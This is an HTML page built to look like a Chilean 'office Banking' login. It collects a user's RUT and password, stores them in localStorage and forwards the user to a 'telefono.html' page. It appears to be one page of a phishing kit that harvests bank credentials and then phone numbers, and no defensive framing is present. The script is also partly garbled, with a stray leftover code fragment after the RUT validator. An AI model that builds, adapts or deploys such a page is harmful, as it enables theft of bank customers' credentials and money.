<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ingreso</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: white;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .contenedor {
      border: 3px solid red;
      width: 90vw;
      max-width: 400px;
      padding: 20px;
      background: white;
      box-sizing: border-box;
    }
    .titulo {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 5px;
      margin-bottom: 20px;
    }
    .titulo span:first-child {
      color: black;
      font-weight: bold;
    }
    .titulo span:last-child {
      background-color: red;
      color: white;
      padding: 2px 6px;
      border-radius: 4px;
      font-weight: bold;
    }
    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
      color: black;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      border: 1px solid black;
      margin-top: 5px;
      border-radius: 4px;
      box-sizing: border-box;
    }
    .password-container {
      position: relative;
      width: 100%;
      margin-top: 5px;
    }
    .password-container input {
      width: 100%;
      padding: 10px;
      padding-right: 30px;
      border: 1px solid black;
      border-radius: 4px;
      box-sizing: border-box;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 8px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 14px;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 10px;
      background-color: red;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="contenedor">
    <div class="titulo">
      <span>Ingreso a office</span><span>Banking</span>
    </div>
    <form onsubmit="enviarFormulario(event)">
      <label for="rut">RUT</label>
      <input type="text" id="rut" maxlength="12" required oninput="formatearRUT(this)" />

      <label for="clave">Contrase√±a</label>
      <div class="password-container">
        <input type="password" id="clave" required />
        <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>

      <button type="submit">Ingresar</button>
    </form>
  </div>

  <script>
    function enviarFormulario(e) {
      e.preventDefault();
      const rut = document.getElementById('rut').value;
      const clave = document.getElementById('clave').value;
      localStorage.setItem('rut', rut);
      localStorage.setItem('clave', clave);
      window.location.href = 'telefono.html';
    }

    function togglePassword() {
      const claveInput = document.getElementById('clave');
      claveInput.type = claveInput.type === 'password' ? 'text' : 'password';
    }

    
function formatearRUT(input) {
  let rut = input.value.replace(/[^0-9kK]/g, '').toUpperCase();
  if (rut.length > 1) {
    const cuerpo = rut.slice(0, -1);
    const dv = rut.slice(-1);
    input.value = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".") + '-' + dv;
  } else {
    input.value = rut;
  }
  input.setCustomValidity(validarRut(input.value) ? "" : "RUT inv√°lido");
}

function validarRut(rutCompleto) {
  rutCompleto = rutCompleto.replace(/\./g, '').replace(/-/g, '').toUpperCase();
  const rut = rutCompleto.slice(0, -1);
  const dv = rutCompleto.slice(-1);

  let suma = 0;
  let multiplo = 2;

  for (let i = rut.length - 1; i >= 0; i--) {
    suma += parseInt(rut.charAt(i)) * multiplo;
    multiplo = multiplo === 7 ? 2 : multiplo + 1;
  }

  const dvEsperado = 11 - (suma % 11);
  let dvCalculado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();

  return dv === dvCalculado;
}

      if (rut.length > 1) {
        rut = rut.slice(0, -1).replace(/\B(?=(\d{3})+(?!\d))/g, '.') + '-' + rut.slice(-1);
      }
      input.value = rut;
    }
  </script>
</body>
</html>
